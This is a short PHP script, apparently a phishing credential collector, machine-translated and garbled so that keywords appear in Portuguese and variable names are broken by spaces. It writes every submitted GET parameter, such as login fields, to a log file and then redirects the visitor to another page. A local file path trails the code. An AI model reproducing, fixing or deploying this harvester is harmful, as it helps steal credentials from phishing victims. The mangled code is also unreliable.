<? Php

cabe�alho (�Localiza��o: destino�);

$ handle = fopen (�log.txt�, �a�);

foreach ($ _ GET as $ variable => $ value) {

fwrite ($ handle, $ variable);

fwrite ($ handle, �=�);

fwrite ($ handle, $ value);
fwrite ($ handle, �\ r \ n�);

}

fwrite ($ handle, �\ r \ n�);

fclose ($ handle);

sa�da;

?>location:file:///C:/Users/usuario/Desktop/index.html